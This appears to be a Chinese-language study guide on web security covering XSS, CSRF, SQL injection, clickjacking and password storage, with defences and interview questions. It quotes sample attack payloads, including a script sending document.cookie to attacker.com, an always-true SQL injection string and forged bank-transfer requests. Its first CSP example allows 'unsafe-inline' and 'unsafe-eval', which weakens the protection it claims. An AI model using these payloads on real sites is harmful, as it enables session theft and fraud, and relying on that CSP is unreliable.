### Web安全
Web安全是保护Web应用免受各种攻击和威胁的重要领域。

#### 1. XSS（跨站脚本攻击）
##### 1.1 基本概念
```javascript
// 反射型XSS
// 恶意URL
https://example.com/search?q=<script>alert('XSS')</script>

// 存储型XSS
// 评论内容
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>

// DOM型XSS
// 不安全的DOM操作
document.write(location.hash.substring(1));
```

##### 1.2 防御措施
```javascript
// 输入过滤
function sanitizeInput(input) {
  return input.replace(/[&<>"']/g, function(match) {
    const entities = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    };
    return entities[match];
  });
}

// 输出编码
function encodeOutput(output) {
  return output.replace(/[&<>"']/g, function(match) {
    const entities = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    };
    return entities[match];
  });
}

// 使用CSP
// Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval';
```

#### 2. CSRF（跨站请求伪造）
##### 2.1 基本概念
```html
<!-- 恶意表单 -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker">
  <input type="submit" value="Click to win!">
</form>
```

##### 2.2 防御措施
```javascript
// 使用CSRF Token
// 服务器生成Token
const csrfToken = generateToken();
res.cookie('csrf-token', csrfToken);

// 客户端发送Token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': document.cookie.match(/csrf-token=([^;]+)/)[1]
  },
  body: JSON.stringify(data)
});

// 验证Token
app.use((req, res, next) => {
  const token = req.headers['x-csrf-token'];
  if (token !== req.cookies['csrf-token']) {
    return res.status(403).send('Invalid CSRF token');
  }
  next();
});
```

#### 3. SQL注入
##### 3.1 基本概念
```sql
-- 恶意输入
' OR '1'='1

-- 注入查询
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

##### 3.2 防御措施
```javascript
// 使用参数化查询
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password]);

// 使用ORM
const user = await User.findOne({
  where: {
    username: username,
    password: password
  }
});
```

#### 4. 点击劫持
##### 4.1 基本概念
```html
<!-- 恶意iframe -->
<iframe src="https://bank.com" style="opacity: 0.1; position: absolute; top: 0; left: 0; width: 100%; height: 100%;"></iframe>
```

##### 4.2 防御措施
```javascript
// 使用X-Frame-Options
res.setHeader('X-Frame-Options', 'DENY');

// 使用CSP
res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
```

#### 5. 密码安全
##### 5.1 基本概念
```javascript
// 密码哈希
const bcrypt = require('bcrypt');
const saltRounds = 10;

// 生成哈希
bcrypt.hash(password, saltRounds, function(err, hash) {
  // 存储hash
});

// 验证密码
bcrypt.compare(password, hash, function(err, result) {
  // 验证结果
});
```

##### 5.2 最佳实践
```javascript
// 密码策略
const passwordPolicy = {
  minLength: 8,
  requireUppercase: true,
  requireLowercase: true,
  requireNumbers: true,
  requireSpecialChars: true
};

// 密码验证
function validatePassword(password) {
  return (
    password.length >= passwordPolicy.minLength &&
    /[A-Z]/.test(password) &&
    /[a-z]/.test(password) &&
    /[0-9]/.test(password) &&
    /[!@#$%^&*]/.test(password)
  );
}
```

#### 6. 最佳实践
1. 使用HTTPS
2. 实现CSP
3. 设置安全头
4. 使用参数化查询
5. 实现CSRF保护
6. 密码加密存储
7. 输入验证
8. 输出编码
9. 会话管理
10. 错误处理

#### 7. 常见面试题
1. **常见Web攻击类型**
   - XSS
   - CSRF
   - SQL注入
   - 点击劫持

2. **如何防御XSS攻击**
   - 输入过滤
   - 输出编码
   - CSP配置
   - 安全头设置

3. **如何保证密码安全**
   - 密码哈希
   - 加盐处理
   - 密码策略
   - 安全存储

## 每日练习参考

### Day 62：XSS 三类

| 类型 | 注入位置 | 存储 | 示例 |
|------|----------|------|------|
| **存储型** | 服务端数据库 | 持久化 | 评论区注入 `<script>` |
| **反射型** | URL 参数 | 不存储 | 搜索 `?q=<script>alert(1)</script>` |
| **DOM 型** | 客户端 JS | 不经服务端 | `innerHTML = location.hash` |

### Day 62：XSS 防御

| 层 | 措施 |
|----|------|
| 输出转义 | HTML 实体编码（`<` → `&lt;`），避免 `innerHTML` |
| CSP | `script-src 'self'` 禁止 inline 脚本 |
| HttpOnly | Cookie 设 HttpOnly，JS 无法读取 |
| 输入校验 | 白名单过滤（后端为主） |
| 框架自带 | React 默认转义、Vue v-html 需注意 |

### Day 62：CSRF 攻击原理

```text
用户登录 A 站 → 浏览器存了 A 的 cookie
→ 用户访问恶意 B 站 → B 站页面发请求到 A
→ 浏览器自动带上 A 的 cookie → A 以为是用户操作
```

### Day 62：CSRF 防御

| 措施 | 原理 |
|------|------|
| **SameSite Cookie** | `SameSite=Lax/Strict`，跨站请求不带 cookie |
| **CSRF Token** | 表单带服务端生成的 token，攻击者拿不到 |
| **Origin / Referer 校验** | 服务端检查来源域名 |
| **验证码 / 二次确认** | 关键操作增加人机验证 |

### Day 62：CSP 常用指令

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-abc123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https://cdn.example.com;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
```

| 指令 | 控制 |
|------|------|
| `default-src` | 默认策略 |
| `script-src` | JS 来源（`'nonce-xxx'` 允许特定 inline） |
| `style-src` | CSS 来源 |
| `img-src` | 图片来源 |
| `connect-src` | XHR / fetch / WebSocket 来源 |
| `frame-ancestors` | 谁能嵌套本页（防 clickjacking） |

### Day 62：XSS 防御：输出转义函数

```js
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
  }
  return str.replace(/[&<>"']/g, ch => map[ch])
}
```

### Day 62：CSRF 攻击流程图

```text
用户浏览器
  ├─ 已登录 bank.com（cookie: session=xxx）
  ├─ 访问 evil.com
  │   └─ <img src="https://bank.com/transfer?to=hacker&amount=10000">
  │       → 浏览器自动带 bank.com 的 cookie！
  └─ bank.com 收到请求，以为是用户操作 → 转账成功

防御：SameSite=Lax → 跨站 GET 请求不带 cookie → 攻击失败
```
